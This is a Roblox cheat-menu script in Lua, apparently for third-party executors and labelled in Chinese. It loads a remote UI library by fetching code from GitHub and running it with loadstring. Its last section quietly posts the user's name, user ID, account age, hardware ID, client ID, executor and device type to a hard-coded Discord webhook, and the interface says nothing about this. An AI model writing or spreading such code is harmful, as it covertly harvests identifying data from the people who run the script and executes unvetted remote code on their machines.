local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 1, 1)
LBL.BackgroundTransparency = 1
LBL.BorderColor3 = Color3.new(0, 0, 0)
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
    LastIteration = tick()
    for Index = #FrameUpdateTable, 1, -1 do
        FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
    end
    FrameUpdateTable[1] = LastIteration
    local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
    CurrentFPS = CurrentFPS - CurrentFPS % 1
    FpsLabel.Text = ("时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S"))
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)

local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/hun/main/jmlibrary1.lua"))();        
local win = ui:new("禁漫中心")
--
local UITab1 = win:Tab("『信息』",'7734068321')

local about = UITab1:section("『信息』",true)



about:Label("禁漫中心㍿")
about:Label("作者QQ：198436746")
about:Label("QQ主群：1001390385")
about:Label("QQ2群： 950954309")
about:Label("QQ3群： 930667114")
about:Label("作者：丁丁")
about:Label("进群发最新禁漫天堂")
about:Label("脚本持续更新中")
about:Label("脚本疯狂优化中")
about:Label("           ")
about:Label("           ")
about:Label("你的注入器:"..identifyexecutor())
about:Label("你的用户名:"..game.Players.LocalPlayer.Character.Name)
about:Label("服务器id:"..game.GameId)


local UITab2 = win:Tab("『公告』",'7734068321')

local about = UITab2:section("『公告』",true)

about:Label("禁漫中心永不跑路")
about:Label("这个新ui稍微有些不稳定")
about:Label("请见谅")
about:Label("       ")
about:Label("感谢大家支持禁漫中心")
about:Label("十分感谢")
about:Label("感谢 不拿拿（哈哈哈我神金又回来了）提供源码")

local Webhook = "https://discord.com/api/webhooks/1278739319498215517/O97HbD7rWfG749SBLcOzw4Fflx14GPGpsW9sH04bwoVnHiOBjWEMRYCD6JQw3ycVil_l"

    local player = game:GetService"Players".LocalPlayer
    local joinTime = os.time() - (player.AccountAge*86400)
    local joinDate = os.date("!*t", joinTime)
    local premium = false
    local alt = true
    _G.IsPc = false
    if player.MembershipType == Enum.MembershipType.Premium then
       premium = true
    end

    if game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
        _G.IsPc = "模拟器/PC"
    elseif game.UserInputService.TouchEnabled then
        _G.IsPc = "IOS/Android"
    else
        _G.IsPc = "IOS/Android/Unknown"
    end

    local executor = identifyexecutor() or "Unknown"
    local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
    Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
    local AvatarImage = Thing.imageUrl

    local msg = {
      
       ["username"] = "bot",

       ["embeds"] = {
           {
               ["color"] = tonumber(tostring("0x32CD32")),
               ["title"] = "有人使用了禁漫中心",
               ["thumbnail"] = {
                ["url"] = AvatarImage,
               },
               ["fields"] = {
                    {
                       ["name"] = "名称(Name)",
                       ["value"] = player.Name,
                       ["inline"] = true
                    },
                    {
                       ["name"] = "昵称(DisplayName)",
                       ["value"] = player.DisplayName,
                       ["inline"] = true
                    },
                    {
                       ["name"] = "UserId",
                       ["value"] = "["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
                       ["inline"] = true
                    },
                    {
                       ["name"] = "地图ID",
                       ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
                       ["inline"] = true
                    },
                    {
                       ["name"] = "地图名称",
                       ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                       ["inline"] = true
                    },
                    {
                       ["name"] = "使用的注入器",
                       ["value"] = executor,
                       ["inline"] = true
                    },
                    {
                       ["name"] = "账号年龄",
                       ["value"] = player.AccountAge.."天",
                       ["inline"] = true
                    },
                    {
                       ["name"] = "加入日期",
                       ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
                       ["inline"] = true
                    },
                    {
                        ["name"] = "HWID",
                        ["value"] = gethwid(),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "客户端ID",
                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "设备",
                        ["value"] = _G.IsPc,
                        ["inline"] = false
                    },
               }
           }
       }
    }
    
  
    request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    